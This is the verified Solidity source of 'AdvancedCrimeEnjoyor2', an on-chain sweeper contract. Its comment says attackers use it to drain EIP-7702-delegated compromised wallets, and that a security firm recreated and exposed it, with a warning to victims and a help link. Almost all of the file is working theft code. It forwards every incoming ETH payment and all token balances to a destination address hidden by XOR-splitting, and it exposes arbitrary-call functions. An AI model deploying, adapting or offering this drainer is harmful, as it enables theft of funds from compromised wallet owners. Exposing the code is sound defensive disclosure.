// Source: blockscout
// Address: 0x289c9c58355e1a7d2b0ad4a5e8f2c3c961b48ae9
// Chain: 1
// Contract: AdvancedCrimeEnjoyor2
// Compiler: 0.8.30+commit.73712a01
// Verified: 2026-06-06T09:22:42.239815Z
// Note: v3b variant — identical to v3 (0x89046d34) but without
//       destroyContract() and the owner state variable.
//       XOR destination: 0xbfe129315f75dd7ba60ec85b4024e0fe1264fb13
pragma solidity 0.8.30;

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract AdvancedCrimeEnjoyor2 {

    /*
        This contract is used by bad guys to automatically sweep all incoming ETH/BNB and all tokens upon the contract call from compromised addresses
        Recreated and exposed by Wintermute
        Check more 7702 data here: https://dune.com/wintermute_research/eip7702

        IF YOU FOUND THIS CONTRACT IN ANY AUTHORIZATION LIST,
        THE EOA DELEGATED TO IT WAS COMPROMISED!!!
        DO NOT SEND ANY ETH/BNB,
        IT WILL BE IMMEDIATELY SWEPT.
        IF THIS ADDRESS BELONGS TO YOU, CONTACT FLASHBOTS WHITEHAT HOTLINE FOR HELP: https://whitehat.flashbots.net
    */

    bytes32 immutable a;
    bytes32 immutable b;

    constructor(bytes32 _a, bytes32 _b) {
        a = _a;
        b = _b;
        bytes32 xoring = _a ^ _b;
        uint256 check = uint256(xoring);
        require(uint160(check) != uint160(0), "Invalid target address");
    }

    event CallExecuted(address, bytes, bool);
    event TokenTransfer(bytes32 indexed topic0, address, uint256, bool) anonymous;
    event Call(bytes32 indexed topic0, uint256, bool) anonymous;
    event Failed(bytes32 indexed topic0) anonymous;

    receive() external payable {
        helperFunction();
    }

    function loserFallback_8092318215() external payable {
        helperFunction();
    }

    function loserSweepETH_11435948882() public {
        uint256 xor_result = xorHelper();
        if (uint160(xor_result) == uint160(0)) {
            emit Failed(hex"fdf70a81a259d767904d3d0f9444e340e5b6e1122826831b998319fc4535b4ec");
            return;
        } else {
            uint256 self_balance = address(this).balance;
            if (self_balance > 0) {
                (bool success, ) = address(uint160(xor_result)).call{value: self_balance}("");
                emit Call(hex"abac7022b3b48d1dadaeb445c02a36f9820e9847a9c8292415acc62973665ebe", self_balance, success);
            }
        }
    }

    function loserMulticall_3869193990(address[] calldata targets, bytes[] calldata datas) public payable {
        require(targets.length == datas.length, "Arrays length mismatch");
        for (uint256 i = 0; i < targets.length; i++) {
            (bool success, ) = targets[i].call(datas[i]);
            emit CallExecuted(targets[i], datas[i], success);
        }
        helperFunction();
    }

    function executeCall(address target, bytes calldata data) public payable {
        callHelper(target, data);
        helperFunction();
    }

    function callHelper(address target, bytes calldata data) internal {
        (bool success, ) = target.call(data);
        emit CallExecuted(target, data, success);
    }

    function helperFunction() internal {
        uint256 xor_result = xorHelper();
        if (uint160(xor_result) == uint160(0)) {
            emit Failed(hex"fdf70a81a259d767904d3d0f9444e340e5b6e1122826831b998319fc4535b4ec");
            return;
        } else {
            uint256 value = msg.value;
            if (value == 0) {
                return;
            } else {
                (bool success, ) = address(uint160(xor_result)).call{value: value}("");
                emit Call(hex"abac7022b3b48d1dadaeb445c02a36f9820e9847a9c8292415acc62973665ebe", value, success);
            }
        }
    }

    function transferTokens(address token) public payable {
        transferHelper(token);
    }

    function transferHelper(address token) internal {
        uint256 xor_result = xorHelper();
        if (uint160(xor_result) == uint160(0)) {
            emit Failed(hex"fdf70a81a259d767904d3d0f9444e340e5b6e1122826831b998319fc4535b4ec");
            return;
        } else {
            address _token = token;
            uint256 token_balance = IERC20(_token).balanceOf(address(this));
            if (token_balance > 0) {
                bool success = IERC20(_token).transfer(address(uint160(xor_result)), token_balance);
                emit TokenTransfer(hex"de90b0fdc12f4ca2384f240d76cdc216ddcf00aa8a3eb80382c17a86c6ebf7ff", token, token_balance, success);
            }
        }
    }

    function xorHelper() internal view returns (uint256 xor_result) {
        bytes32 xoring = a ^ b;
        return uint256(xoring);
    }
}
